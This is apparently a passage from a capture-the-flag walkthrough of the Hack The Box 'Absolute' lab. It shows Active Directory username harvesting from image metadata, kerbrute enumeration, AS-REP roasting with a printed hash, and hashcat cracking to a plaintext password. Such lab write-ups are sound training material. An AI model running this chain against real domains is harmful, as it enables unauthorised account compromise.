# Auth as d.klay
### Get Username List
```bash
for i in $(seq 1 6); do wget "http://absolute.htb/images/hero_${i}.jpg" ; done

for i in $(seq 1 6); do exiftool hero_${i}.jpg | grep Author | awk '{print $3 " " $4}'; done | tee users
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith

~/Tools/username-anarchy/username-anarchy -i users | tee usernames

~/go/bin/kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames

2023/11/14 16:15:54 >  Using KDC(s):
2023/11/14 16:15:54 >   dc.absolute.htb:88

2023/11/14 16:15:54 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       d.klay@absolute.htb
2023/11/14 16:15:55 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2023/11/14 16:15:56 >  [+] VALID USERNAME:       n.smith@absolute.htb
```

##### Double confirm with crackmapexec

```zsh
crackmapexec smb $IP -u usernames_short -p ''
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [-] absolute.htb\j.roberts: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\m.chaffrey: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\s.osvald: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\j.robinson: STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.229.59   445    DC               [-] absolute.htb\n.smith: STATUS_ACCOUNT_RESTRICTION
```

The purple `[-]` fails with `STATUS_ACCOUNT_RESTRICTION` rather than the others which return `STATUS_LOGON_FAILURE`, suggesting those accounts exist

### AS-Rep-Roast
```bash
impacket-GetNPUsers -dc-ip dc.absolute.htb -usersfile usernames_short absolute.htb/

$krb5asrep$23$d.klay@ABSOLUTE.HTB:0873728c96c41252f7e9640eaf9fb9db$3b8c9a135464acfc7c2ad55acd0d61bddd683bbd5ad899897c6f478fa8c15f47f2f6a08904d098ab397ac2c687e708a5e0ba024493ca213f080abd8e30b1b814cc5ee83b1c5beceec377c3fab777e80401adf167865f5e57a205e76f028b3ff3cac758ea6d10baa2b934503a552ee760b81f1912ae5ce2a3c77ddd2d8acc1e472afb689150a276c81ecefacce806c504907a3c987f302e60a844c3d0e65f619901086ad073aefdbf2fbce88bc78312a1d08c86c573f5c8403319b8a09ce8f226e555f14e59d0fd285ac68ccb6748ed02bf34dcb45e7ffde9fdf598025fbf20fdd859c93eca38a785d34cfdda

hashcat d.klay.hash /usr/share/wordlists/rockyou.txt 

Darkmoonsky248girl
```

### Kerberos Auth
```bash
crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl'
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
crackmapexec smb $IP -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.129.229.59   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.59   445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW 
```